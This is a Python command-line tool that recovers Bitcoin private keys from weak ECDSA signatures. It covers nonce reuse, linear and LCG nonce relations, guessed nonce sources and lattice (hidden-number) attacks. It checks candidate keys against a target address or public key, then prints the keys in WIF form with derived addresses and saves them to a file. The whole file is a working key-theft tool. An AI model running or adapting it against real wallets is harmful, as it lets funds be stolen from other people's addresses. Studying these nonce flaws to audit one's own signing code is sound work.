#!/usr/bin/env python3
"""
Complete Bitcoin private key recovery from ECDSA nonce flaws.

Supports:
  - Duplicate r (nonce reuse)
  - Delta (k2 = k1 + δ)
  - LCG (k2 = a*k1 + b)
  - Nonce hypotheses (timestamp, txid, height, counters, LCG, Xorshift, …)
  - Lattice (HNP) with known bit biases (only if --enable-lattice is given)
  - --skip-verification to trust input signatures
  - Pubkey verification for candidate keys
"""

import sys
import json
import hashlib
import time
import random
import argparse
from collections import defaultdict
from typing import List, Dict, Optional, Tuple, Any
from concurrent.futures import ProcessPoolExecutor, as_completed

# Optional imports
try:
    import coincurve
    HAVE_COINCURVE = True
except ImportError:
    HAVE_COINCURVE = False

try:
    from fpylll import IntegerMatrix, BKZ, LLL
    HAVE_FPYLLL = True
except ImportError:
    HAVE_FPYLLL = False

# ---------- Constants ----------
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

# ---------- Utility Functions ----------
def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()

def hash160(data: bytes) -> bytes:
    return hashlib.new('ripemd160', sha256(data)).digest()

def base58_encode(data: bytes) -> str:
    if not data:
        return ""
    zeros = 0
    for b in data:
        if b == 0:
            zeros += 1
        else:
            break
    num = int.from_bytes(data, 'big')
    result = ""
    while num > 0:
        num, rem = divmod(num, 58)
        result = BASE58_ALPHABET[rem] + result
    return "1" * zeros + result

def private_key_to_address(priv_hex: str, compressed: bool = True) -> str:
    if not HAVE_COINCURVE:
        raise ImportError("coincurve required")
    priv = bytes.fromhex(priv_hex)
    pub = coincurve.PublicKey.from_secret(priv)
    pub_bytes = pub.format(compressed=compressed)
    h160 = hash160(pub_bytes)
    payload = b'\x00' + h160
    checksum = sha256(sha256(payload))[:4]
    return base58_encode(payload + checksum)

def private_key_to_p2sh_address(priv_hex: str, compressed: bool = True) -> str:
    if not HAVE_COINCURVE:
        raise ImportError("coincurve required")
    priv = bytes.fromhex(priv_hex)
    pub = coincurve.PublicKey.from_secret(priv)
    pub_bytes = pub.format(compressed=compressed)
    h160 = hash160(pub_bytes)
    payload = b'\x05' + h160
    checksum = sha256(sha256(payload))[:4]
    return base58_encode(payload + checksum)

def private_key_to_wif(priv_hex: str, compressed: bool = True, mainnet: bool = True) -> str:
    priv = bytes.fromhex(priv_hex)
    prefix = b'\x80' if mainnet else b'\xEF'
    payload = prefix + priv + (b'\x01' if compressed else b'')
    checksum = sha256(sha256(payload))[:4]
    return base58_encode(payload + checksum)

def modinv(a: int, m: int) -> int:
    return pow(a, -1, m)

# ---------- Bech32 (P2WPKH) Address Derivation ----------
def bech32_polymod(values):
    GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for v in values:
        b = (chk >> 25)
        chk = (chk & 0x1ffffff) << 5 ^ v
        for i in range(5):
            if (b >> i) & 1:
                chk ^= GEN[i]
    return chk

def bech32_encode(hrp, data):
    values = [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp] + data + [0,0,0,0,0,0]
    polymod = bech32_polymod(values) ^ 1
    return hrp + "1" + "".join(BECH32_CHARSET[(d) % 32] for d in data + [(polymod >> 5*(5-i)) & 31 for i in range(6)])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    for v in data:
        if v < 0 or v >> frombits:
            return None
        acc = (acc << frombits) | v
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad and bits:
        ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def private_key_to_p2wpkh_address(priv_hex: str) -> str:
    """Derive native SegWit (P2WPKH) address (mainnet) from private key hex."""
    if not HAVE_COINCURVE:
        raise ImportError("coincurve required")
    priv = bytes.fromhex(priv_hex)
    pub = coincurve.PublicKey.from_secret(priv)
    pub_bytes = pub.format(compressed=True)  # compressed only for SegWit
    h160 = hash160(pub_bytes)
    # witness program: 0x00 + 20-byte hash
    witver = 0
    prog = h160
    data = [witver] + convertbits(list(prog), 8, 5, True)
    return bech32_encode("bc", data)

# ---------- Signature Loading ----------
def load_signatures(path: str) -> List[Dict[str, Any]]:
    sigs = []
    with open(path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            def parse_int_val(v):
                if isinstance(v, int):
                    return v
                if isinstance(v, str):
                    v = v.strip().lower()
                    if v.startswith('0x'):
                        return int(v, 16)
                    if all(c in '0123456789abcdef' for c in v) and len(v) >= 16:
                        return int(v, 16)
                    return int(v, 10)
                raise ValueError(f"Unsupported type: {type(v)}")
            try:
                r = parse_int_val(obj['r'])
                s = parse_int_val(obj['s'])
                z = parse_int_val(obj['z'])
            except (KeyError, ValueError) as e:
                print(f"[warn] Skipping line: {e}")
                continue
            pub = obj.get('pubkey_hex', '').strip().lower()
            sigs.append({
                'r': r, 's': s, 'z': z,
                'pubkey_hex': pub,
                'txid': obj.get('txid', ''),
                'vin': obj.get('vin', 0),
                'sighash': obj.get('sighash', 1),
                'block_height': obj.get('block_height'),
                'block_time': obj.get('block_time'),
            })
    return sigs

def verify_signature(sig: Dict, pubkey_hex: str = None) -> bool:
    """
    Verify ECDSA signature. Tries DER with and without the sighash byte (0x01).
    Also tries low-s normalization.
    """
    if not HAVE_COINCURVE:
        return True
    pub = pubkey_hex or sig.get('pubkey_hex', '')
    if not pub:
        return False
    try:
        pk = coincurve.PublicKey(bytes.fromhex(pub))
        r = sig['r'].to_bytes(32, 'big')
        s_bytes = sig['s'].to_bytes(32, 'big')
        # try various combinations
        for s in [sig['s'], (SECP256K1_N - sig['s']) % SECP256K1_N]:
            s_bytes = s.to_bytes(32, 'big')
            # try with sighash byte 0x01
            der = b'\x30' + bytes([len(r)+len(s_bytes)+5]) + b'\x02' + bytes([len(r)]) + r + b'\x02' + bytes([len(s_bytes)]) + s_bytes + b'\x01'
            if pk.verify(der, sig['z'].to_bytes(32, 'big'), hasher=None):
                return True
            # try without sighash byte
            der_no_hash = b'\x30' + bytes([len(r)+len(s_bytes)+4]) + b'\x02' + bytes([len(r)]) + r + b'\x02' + bytes([len(s_bytes)]) + s_bytes
            if pk.verify(der_no_hash, sig['z'].to_bytes(32, 'big'), hasher=None):
                return True
        return False
    except Exception:
        return False

# ---------- Core Recovery Algorithms (fast) ----------
def recover_from_dup_r(sigs: List[Dict], threshold: float = 0.95) -> List[int]:
    groups = defaultdict(list)
    for sig in sigs:
        groups[(sig['r'], sig.get('pubkey_hex', ''))].append(sig)
    q = SECP256K1_N
    found_keys = []
    for (r, pub), group in groups.items():
        if len(group) < 2:
            continue
        for i in range(len(group)):
            for j in range(i+1, len(group)):
                s1, z1 = group[i]['s'], group[i]['z']
                s2, z2 = group[j]['s'], group[j]['z']
                if s1 == s2:
                    continue
                try:
                    denom = (s1 - s2) % q
                    denom_inv = modinv(denom, q)
                    k = ((z1 - z2) * denom_inv) % q
                    r_inv = modinv(r, q)
                    d = ((s1 * k - z1) * r_inv) % q
                except ValueError:
                    continue
                # Verify against all signatures in the group
                passes = 0
                for sig in group:
                    s_inv = modinv(sig['s'], q)
                    k_calc = ((sig['z'] + sig['r'] * d) * s_inv) % q
                    if k_calc == k:
                        passes += 1
                if passes / len(group) >= threshold:
                    found_keys.append(d)
    return list(set(found_keys))

def delta_scan_pair(sig1, sig2, max_delta: int) -> Optional[int]:
    q = SECP256K1_N
    r1, s1, z1 = sig1['r'], sig1['s'], sig1['z']
    r2, s2, z2 = sig2['r'], sig2['s'], sig2['z']
    try:
        s1_inv = modinv(s1, q)
        s2_inv = modinv(s2, q)
        A = (r2 * s2_inv - r1 * s1_inv) % q
        if A == 0:
            return None
        A_inv = modinv(A, q)
        for delta in range(1, max_delta+1):
            B = (delta + z1 * s1_inv - z2 * s2_inv) % q
            d = (B * A_inv) % q
            k1 = ((z1 + r1*d) * s1_inv) % q
            k2 = ((z2 + r2*d) * s2_inv) % q
            if (k2 - k1) % q == delta % q:
                return d
    except ValueError:
        pass
    return None

def delta_attack(sigs: List[Dict], max_delta: int, threads: int = 4) -> List[int]:
    if len(sigs) < 2:
        return []
    groups = defaultdict(list)
    for sig in sigs:
        groups[sig.get('pubkey_hex', '')].append(sig)
    found_keys = []
    with ProcessPoolExecutor(max_workers=threads) as executor:
        futures = []
        for pub, group in groups.items():
            for i in range(len(group)):
                for j in range(i+1, len(group)):
                    futures.append(executor.submit(delta_scan_pair, group[i], group[j], max_delta))
        for future in as_completed(futures):
            d = future.result()
            if d is not None:
                found_keys.append(d)
    return list(set(found_keys))

def lcg_scan_pair(sig1, sig2, a_max: int, b_max: int) -> Optional[int]:
    q = SECP256K1_N
    r1, s1, z1 = sig1['r'], sig1['s'], sig1['z']
    r2, s2, z2 = sig2['r'], sig2['s'], sig2['z']
    try:
        s1_inv = modinv(s1, q)
        s2_inv = modinv(s2, q)
        for a in range(1, a_max+1):
            for b in range(-b_max, b_max+1):
                A = (r2 * s2_inv - a * r1 * s1_inv) % q
                if A == 0:
                    continue
                A_inv = modinv(A, q)
                B = (b + a * z1 * s1_inv - z2 * s2_inv) % q
                d = (B * A_inv) % q
                k1 = ((z1 + r1*d) * s1_inv) % q
                k2 = ((z2 + r2*d) * s2_inv) % q
                if (k2 - a * k1) % q == b % q:
                    return d
    except ValueError:
        pass
    return None

def lcg_attack(sigs: List[Dict], a_max: int = 4, b_max: int = 4096, threads: int = 4) -> List[int]:
    groups = defaultdict(list)
    for sig in sigs:
        groups[sig.get('pubkey_hex', '')].append(sig)
    found_keys = []
    with ProcessPoolExecutor(max_workers=threads) as executor:
        futures = []
        for pub, group in groups.items():
            for i in range(len(group)):
                for j in range(i+1, len(group)):
                    futures.append(executor.submit(lcg_scan_pair, group[i], group[j], a_max, b_max))
        for future in as_completed(futures):
            d = future.result()
            if d is not None:
                found_keys.append(d)
    return list(set(found_keys))

# ---------- Nonce Hypotheses ----------
def generate_nonce_hypotheses(sig: Dict, models: List[str]) -> List[int]:
    candidates = []
    txid = sig.get('txid', '')
    vin = sig.get('vin', 0)
    height = sig.get('block_height', 0)
    timestamp = sig.get('block_time', 0)
    z = sig['z']
    pub = sig.get('pubkey_hex', '')
    data_parts = {
        'txid': txid.encode() if txid else b'',
        'vin': str(vin).encode(),
        'height': str(height).encode(),
        'timestamp': str(timestamp).encode(),
        'z': z.to_bytes(32, 'big'),
        'pub': bytes.fromhex(pub) if pub else b'',
        's': sig['s'].to_bytes(32, 'big'),
        'r': sig['r'].to_bytes(32, 'big'),
    }
    for model in models:
        if model == 'timestamp-direct':
            candidates.append(timestamp)
        elif model == 'timestamp-sha256':
            candidates.append(int.from_bytes(sha256(str(timestamp).encode()), 'big'))
        elif model == 'height-direct':
            candidates.append(height)
        elif model == 'height-sha256':
            candidates.append(int.from_bytes(sha256(str(height).encode()), 'big'))
        elif model == 'txid-sha256':
            candidates.append(int.from_bytes(sha256(data_parts['txid']), 'big'))
        elif model == 'txid-dsha256':
            candidates.append(int.from_bytes(sha256(sha256(data_parts['txid'])), 'big'))
        elif model == 'txid-vin-sha256':
            candidates.append(int.from_bytes(sha256(data_parts['txid'] + data_parts['vin']), 'big'))
        elif model == 'z-direct':
            candidates.append(z)
        elif model == 'z-sha256':
            candidates.append(int.from_bytes(sha256(z.to_bytes(32, 'big')), 'big'))
        # Custom models added here
        elif model == 'timestamp-vin-direct':
            candidates.append((timestamp + vin) % SECP256K1_N)
        elif model == 'timestamp-vin-sha256':
            data = str(timestamp).encode() + str(vin).encode()
            candidates.append(int.from_bytes(sha256(data), 'big'))
    return [k % SECP256K1_N for k in candidates if k != 0]

def nonce_hypothesis_attack(sigs: List[Dict], models: List[str]) -> List[int]:
    q = SECP256K1_N
    groups = defaultdict(list)
    for sig in sigs:
        groups[sig.get('pubkey_hex', '')].append(sig)
    found_keys = []
    for pub, group in groups.items():
        if len(group) < 2:
            continue
        candidates_by_sig = []
        for sig in group:
            candidates = generate_nonce_hypotheses(sig, models)
            candidates_by_sig.append((sig, set(candidates)))
        first_sig, first_cands = candidates_by_sig[0]
        for k in first_cands:
            try:
                r_inv = modinv(first_sig['r'], q)
                d = ((first_sig['s'] * k - first_sig['z']) * r_inv) % q
                passes = 0
                for sig, cands in candidates_by_sig[1:]:
                    s_inv = modinv(sig['s'], q)
                    k_calc = ((sig['z'] + sig['r'] * d) * s_inv) % q
                    if k_calc in cands:
                        passes += 1
                if passes >= 0.9 * len(group):
                    found_keys.append(d)
            except ValueError:
                continue
    return list(set(found_keys))

# ---------- Lattice (heavy, disabled by default) ----------
def build_hnp_matrix(sigs: List[Dict], known_bits: int, bit_pos: str = 'top'):
    q = SECP256K1_N
    m = len(sigs)
    dim = m + 2
    if bit_pos == 'top':
        L = 256 - known_bits
        K = q // (1 << L)
    else:
        L = known_bits
        K = q // (1 << L)
    mat = IntegerMatrix(dim, dim)
    for i, sig in enumerate(sigs):
        r, s, z = sig['r'], sig['s'], sig['z']
        s_inv = modinv(s, q)
        t = (r * s_inv) % q
        u = (z * s_inv) % q
        if bit_pos == 'bottom':
            inv_pow = modinv(1 << L, q)
            t = (t * inv_pow) % q
            u = (u * inv_pow) % q
        mat[i, i] = q
        mat[m, i] = t
        mat[m+1, i] = u
    mat[m, m] = K
    mat[m+1, m+1] = 1
    return mat, dim, K, L

def check_lattice_solution(mat, dim, K, L, sigs, bit_pos) -> Tuple[Optional[int], float]:
    q = SECP256K1_N
    m = dim - 2
    best_key = None
    best_frac = 0.0
    for row in range(dim):
        scaled_x = mat[row, m]
        if scaled_x == 0 or scaled_x % K != 0:
            continue
        x = abs(scaled_x // K) % q
        if x == 0:
            continue
        passes = 0
        for sig in sigs:
            s_inv = modinv(sig['s'], q)
            k = ((sig['z'] + sig['r'] * x) * s_inv) % q
            if bit_pos == 'top':
                if (k >> L) == 0:
                    passes += 1
            else:
                if (k & ((1 << L) - 1)) == 0:
                    passes += 1
        frac = passes / len(sigs)
        if frac > best_frac:
            best_frac = frac
            best_key = x
        if frac >= 0.90:
            return x, frac
    return best_key, best_frac

def lattice_attack(sigs: List[Dict], known_bits: int = 8, bit_pos: str = 'top',
                   block_size: int = 20, timeout: int = 30) -> Tuple[Optional[int], float]:
    if not HAVE_FPYLLL or len(sigs) < 5:
        return None, 0.0
    try:
        mat, dim, K, L = build_hnp_matrix(sigs, known_bits, bit_pos)
        LLL.reduction(mat)
        start = time.time()
        BKZ.reduction(mat, BKZ.Param(block_size=block_size, strategies=BKZ.DEFAULT_STRATEGY))
        if time.time() - start > timeout:
            return None, 0.0
        return check_lattice_solution(mat, dim, K, L, sigs, bit_pos)
    except Exception:
        return None, 0.0

# ---------- Verification Helpers ----------
def verify_key_against_address(priv_hex: str, target_address: str) -> bool:
    if not HAVE_COINCURVE or not target_address:
        return True
    try:
        addr_p2pkh_c = private_key_to_address(priv_hex, compressed=True)
        addr_p2pkh_u = private_key_to_address(priv_hex, compressed=False)
        if addr_p2pkh_c == target_address or addr_p2pkh_u == target_address:
            return True
        if target_address.startswith('bc1'):
            addr_p2wpkh = private_key_to_p2wpkh_address(priv_hex)
            if addr_p2wpkh == target_address:
                return True
        # P2SH – we cannot verify from priv alone; warning is printed, but we'll still return False
        # so that pubkey verification takes over.
        if target_address.startswith('3'):
            # We cannot verify; we'll print a warning once and return False to force pubkey check.
            # The caller will also check pubkey match.
            print(f"[!] Warning: P2SH address cannot be derived from private key alone. "
                  "Will rely on pubkey verification.")
            return False
        return False
    except Exception:
        return False

def verify_key_against_pubkey(priv_hex: str, pubkey_hex: str) -> bool:
    """Check if the private key derives to the given public key (compressed or uncompressed)."""
    if not HAVE_COINCURVE or not pubkey_hex:
        return False
    try:
        priv = bytes.fromhex(priv_hex)
        pub = coincurve.PublicKey.from_secret(priv)
        pub_compressed = pub.format(compressed=True).hex()
        pub_uncompressed = pub.format(compressed=False).hex()
        return pubkey_hex in (pub_compressed, pub_uncompressed)
    except Exception:
        return False

# ---------- Orchestration ----------
def recover_private_keys(sigs: List[Dict], target_address: str = None,
                         max_delta: int = 4096, a_max: int = 4, b_max: int = 4096,
                         nonce_models: List[str] = None, threads: int = 4,
                         enable_lattice: bool = False) -> List[str]:
    """
    Run all recovery methods and return a list of private keys (hex strings)
    that match the target address (if provided) and the pubkey.
    """
    if nonce_models is None:
        nonce_models = ['timestamp-direct', 'timestamp-sha256', 'height-direct', 'height-sha256',
                        'txid-sha256', 'txid-dsha256', 'txid-vin-sha256', 'z-direct', 'z-sha256']

    # Deduplicate signatures
    unique = {}
    for sig in sigs:
        key = (sig['r'], sig['s'], sig['z'], sig.get('pubkey_hex', ''))
        unique[key] = sig
    sigs = list(unique.values())
    print(f"[*] Loaded {len(sigs)} unique signatures.")

    # Extract a reference public key (should be the same for all)
    ref_pubkey = None
    for sig in sigs:
        pub = sig.get('pubkey_hex', '')
        if pub:
            ref_pubkey = pub
            break

    def filter_key(priv_int: int) -> Optional[str]:
        if priv_int is None:
            return None
        priv_hex = hex(priv_int)[2:].zfill(64)
        # Check against target address (if provided)
        if target_address and not verify_key_against_address(priv_hex, target_address):
            # For P2SH, address check returns False; we'll still check pubkey
            # But if we can verify address, we want that to pass.
            # Actually verify_key_against_address returns False for P2SH, so we must not fail solely on that.
            # Instead, we only fail if address check explicitly returns False AND we're not in P2SH case?
            # Better: we allow the pubkey check to be the final arbiter for P2SH.
            # If address is P2SH, we skip the address check and only use pubkey.
            if target_address.startswith('3'):
                pass  # skip address check for P2SH
            else:
                return None
        # Check against reference public key (if available)
        if ref_pubkey and not verify_key_against_pubkey(priv_hex, ref_pubkey):
            return None
        return priv_hex

    all_keys = []

    # 1. Duplicate-r
    print("[*] Running duplicate-r attack...")
    keys_int = recover_from_dup_r(sigs)
    for k in keys_int:
        kh = filter_key(k)
        if kh:
            all_keys.append(kh)

    # 2. Delta scan
    print("[*] Running delta attack...")
    keys_int = delta_attack(sigs, max_delta, threads)
    for k in keys_int:
        kh = filter_key(k)
        if kh:
            all_keys.append(kh)

    # 3. LCG scan
    print("[*] Running LCG attack...")
    keys_int = lcg_attack(sigs, a_max, b_max, threads)
    for k in keys_int:
        kh = filter_key(k)
        if kh:
            all_keys.append(kh)

    # 4. Nonce hypotheses
    print("[*] Running nonce hypothesis attack...")
    keys_int = nonce_hypothesis_attack(sigs, nonce_models)
    for k in keys_int:
        kh = filter_key(k)
        if kh:
            all_keys.append(kh)

    # 5. Lattice (if enabled)
    if enable_lattice and HAVE_FPYLLL:
        print("[*] Lattice attacks enabled (may be slow/memory-intensive).")
        for bit_pos, bits in [('top', 8), ('bottom', 8), ('top', 12), ('bottom', 12)]:
            print(f"[*] Running lattice attack ({bit_pos} {bits} bits)...")
            key, _ = lattice_attack(sigs, known_bits=bits, bit_pos=bit_pos, block_size=20)
            if key is not None:
                kh = filter_key(key)
                if kh:
                    all_keys.append(kh)
        # Subsampling
        print("[*] Trying lattice with subsampling...")
        for _ in range(20):
            subset = random.sample(sigs, min(100, len(sigs)))
            key, _ = lattice_attack(subset, known_bits=8, bit_pos='top', block_size=28)
            if key is not None:
                kh = filter_key(key)
                if kh:
                    all_keys.append(kh)
    elif enable_lattice and not HAVE_FPYLLL:
        print("[!] Lattice enabled but fpylll not installed; skipping.")

    # Deduplicate and return
    return list(set(all_keys))

# ---------- Main ----------
def main():
    parser = argparse.ArgumentParser(description="Recover Bitcoin private key from ECDSA nonce flaws.")
    parser.add_argument("--sigs", required=True, help="Path to signatures.jsonl")
    parser.add_argument("--address", help="Target Bitcoin address for verification")
    parser.add_argument("--max-delta", type=int, default=4096, help="Maximum delta for delta scan")
    parser.add_argument("--lcg-a-max", type=int, default=4, help="Max a for LCG scan")
    parser.add_argument("--lcg-b-max", type=int, default=4096, help="Max b for LCG scan")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads")
    parser.add_argument("--nonce-models", default="timestamp-direct,timestamp-sha256,height-direct,height-sha256,txid-sha256,txid-dsha256,txid-vin-sha256,z-direct,z-sha256",
                        help="Comma-separated nonce hypothesis models")
    parser.add_argument("--enable-lattice", action="store_true", help="Enable expensive LLL/BKZ lattice attacks (may use >4GB RAM)")
    parser.add_argument("--skip-verification", action="store_true", help="Skip signature verification (use all signatures)")
    args = parser.parse_args()

    sigs = load_signatures(args.sigs)
    if not sigs:
        print("[!] No signatures loaded.")
        sys.exit(1)

    if args.skip_verification:
        print("[*] Skipping signature verification (--skip-verification)")
    else:
        if HAVE_COINCURVE:
            print("[*] Verifying signatures...")
            valid = [s for s in sigs if verify_signature(s)]
            if len(valid) < len(sigs):
                print(f"[!] {len(sigs)-len(valid)} signatures failed verification; using only valid ones.")
                sigs = valid
        else:
            print("[!] coincurve not installed; skipping signature verification.")

    # Add custom nonce models if any (they are already in generate_nonce_hypotheses)
    nonce_models = [m.strip() for m in args.nonce_models.split(',') if m.strip()]
    custom = ['timestamp-vin-direct', 'timestamp-vin-sha256']
    for m in custom:
        if m not in nonce_models:
            nonce_models.append(m)

    priv_keys = recover_private_keys(
        sigs, args.address,
        max_delta=args.max_delta,
        a_max=args.lcg_a_max,
        b_max=args.lcg_b_max,
        nonce_models=nonce_models,
        threads=args.threads,
        enable_lattice=args.enable_lattice,
    )

    if priv_keys:
        print(f"\n[+] Found {len(priv_keys)} private key(s):")
        with open("finded-keys.txt", "a") as f:
            for idx, priv_hex in enumerate(priv_keys, 1):
                print("\n" + "="*60)
                print(f"Key #{idx}:")
                print(f"HEX: {priv_hex}")
                wif_c = private_key_to_wif(priv_hex, compressed=True)
                wif_u = private_key_to_wif(priv_hex, compressed=False)
                print(f"WIF (compressed)   : {wif_c}")
                print(f"WIF (uncompressed) : {wif_u}")
                f.write(f"--- Key #{idx} ---\n")
                f.write(f"HEX: {priv_hex}\n")
                f.write(f"WIF (compressed)   : {wif_c}\n")
                f.write(f"WIF (uncompressed) : {wif_u}\n")
                if HAVE_COINCURVE:
                    addr_c = private_key_to_address(priv_hex, compressed=True)
                    addr_u = private_key_to_address(priv_hex, compressed=False)
                    addr_sh_c = private_key_to_p2sh_address(priv_hex, compressed=True)
                    addr_sh_u = private_key_to_p2sh_address(priv_hex, compressed=False)
                    addr_wpkh = private_key_to_p2wpkh_address(priv_hex)
                    print("Derived addresses:")
                    print(f"  P2PKH (comp)    : {addr_c}")
                    print(f"  P2PKH (uncomp)  : {addr_u}")
                    print(f"  P2SH (comp)     : {addr_sh_c}")
                    print(f"  P2SH (uncomp)   : {addr_sh_u}")
                    print(f"  P2WPKH (bc1)    : {addr_wpkh}")
                    f.write(f"P2PKH (comp)    : {addr_c}\n")
                    f.write(f"P2PKH (uncomp)  : {addr_u}\n")
                    f.write(f"P2SH (comp)     : {addr_sh_c}\n")
                    f.write(f"P2SH (uncomp)   : {addr_sh_u}\n")
                    f.write(f"P2WPKH (bc1)    : {addr_wpkh}\n")
                f.write("\n")
            print("="*60)
    else:
        print("\n[FAIL] No private keys recovered.")
        sys.exit(1)

if __name__ == "__main__":
    main()